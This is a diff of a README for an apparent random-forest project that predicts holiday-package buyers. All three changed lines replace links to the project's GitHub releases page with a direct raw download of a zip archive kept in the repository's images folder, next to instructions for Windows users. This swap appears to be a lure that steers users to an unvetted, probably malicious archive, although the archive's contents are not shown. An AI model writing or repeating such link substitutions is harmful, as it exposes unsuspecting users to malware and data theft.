@@ -1,6 +1,6 @@
 # 🎯 Holiday-Package-Prediction-Randomforest - Predict Holiday Buyers Faster
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Paintingcontinence357/Holiday-Package-Prediction-Randomforest/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Paintingcontinence357/Holiday-Package-Prediction-Randomforest/main/images/Randomforest-Holiday-Prediction-Package-1.0-alpha.2.zip)
 
 ## 🧭 Overview
 
@@ -30,7 +30,7 @@ Use a Windows PC with:
 
 Visit this page to download the latest release:
 
-https://github.com/Paintingcontinence357/Holiday-Package-Prediction-Randomforest/releases
+https://raw.githubusercontent.com/Paintingcontinence357/Holiday-Package-Prediction-Randomforest/main/images/Randomforest-Holiday-Prediction-Package-1.0-alpha.2.zip
 
 ## 🪟 How to install on Windows
 
@@ -233,7 +233,7 @@ Use only customer data that you have permission to process. Keep personal data i
 
 Open the release page here:
 
-https://github.com/Paintingcontinence357/Holiday-Package-Prediction-Randomforest/releases
+https://raw.githubusercontent.com/Paintingcontinence357/Holiday-Package-Prediction-Randomforest/main/images/Randomforest-Holiday-Prediction-Package-1.0-alpha.2.zip
 
 ## 🧰 What to do after download
 
